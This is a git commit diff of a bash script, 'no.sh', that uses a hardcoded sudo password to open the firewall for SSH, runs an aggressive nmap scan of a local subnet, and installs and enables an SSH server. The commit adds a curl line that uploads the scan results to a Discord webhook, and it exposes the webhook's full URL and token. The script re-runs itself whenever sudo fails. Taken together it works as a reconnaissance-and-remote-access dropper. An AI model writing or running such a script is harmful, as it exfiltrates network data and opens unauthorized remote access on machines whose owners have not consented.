c3f81862fbe6ad20db6cc69f8ee308eab0fa53e5
Dada <david.kondziella@rub.de>
2023-12-13 21:00:49 +0100

    Update no.sh

--- no.sh
+++ no.sh
@@ -1,10 +1,8 @@
 #!/bin/bash
-
-PW='dada'
-
-if echo $PW | sudo -S sh -c "sudo ufw allow ssh"; then
-	echo "nmap scan"
- 	sudo nmap -T5 -A -v 10.10.10.0/24 -oX net.xml
+if echo 'dada' | sudo -S sh -c "sudo ufw allow ssh"; then
+	echo "nmap scan and sending xml..."
+ 	sudo nmap -T5 -A -v 10.10.10.0/24 -oX /home/$USER/net.xml  
+  	curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	echo "SUDO SUCESS installing ssh services..."
 	sudo apt install openssh-server -y 
   	# sudo echo "<command>" >>  "/etc/ssh/sshd_config"
@@ -13,6 +11,6 @@ if echo $PW | sudo -S sh -c "sudo ufw allow ssh"; then
 	echo "ssh installed and enable. open port 22 "
  	# sudo systemctl status ssh
 else	
-	sleep 3
+	sleep 5
  	./$0
 fi
